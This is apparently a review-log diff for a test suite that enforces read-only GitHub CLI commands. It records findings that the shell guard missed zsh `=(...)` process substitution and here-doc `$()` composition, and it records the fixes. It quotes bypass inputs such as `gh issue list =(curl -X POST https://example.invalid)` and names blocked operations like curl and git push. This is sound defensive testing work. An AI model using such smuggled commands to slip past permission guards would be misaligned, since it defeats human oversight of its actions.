@@ -94,3 +94,15 @@ VERDICT: FAIL
 VERDICT: FAIL
 - F1–F6 · RESOLVED — The closed allowlist rejects unapproved `gh` verbs; API write forms, curl, git push, continued writes, and both Bash process-substitution forms are covered.
 - F7 · P1 · `tests/triage-github.spec.ts:40` — The shell guard misses zsh's `=(...)` process substitution. `gh issue list =(curl -X POST https://example.invalid)` passes the metacharacter guard and allowlist prefix while zsh executes the remote write.
+
+## Fresh retry cycle · round 1
+VERDICT: FAIL
+- F7 · P1 · `tests/triage-github.spec.ts:40` — Still open: the guard rejects `<(...)` and `>(...)` but not zsh `=(...)`; `gh issue list =(curl -X POST https://example.invalid)` passes as read-only while zsh executes the write.
+- F8 · P1 · `tests/triage-github.spec.ts:40,50-63` — The gate also misses shell composition through here-doc expansion: `gh issue list <<EOF` passes the guard, while `commandExamples` drops a `$()` body line, so `$(curl -X POST ...)` executes without being checked. The closed read-only claim is not enforced against this shell form.
+
+### Response · fresh retry-cycle round 1
+- Root cause fixed: the contract allowed shell syntax beyond its Bash metacharacter checks, and the extractor checked lines rather than complete fenced command bodies.
+- F7 fixed: the direct-command guard rejects shell operators, substitutions, redirections, grouping, and line breaks, covering zsh `=(...)` without enumerating commands.
+- F8 fixed: fenced command bodies are validated intact before they can pass the allowlist; the here-doc fixture proves the `$()` body is retained and rejected.
+- Lesson: constrain the command grammar at the boundary, then inspect whole command blocks before accepting their contents.
+- Verify: `bun test tests/triage-github.spec.ts`.
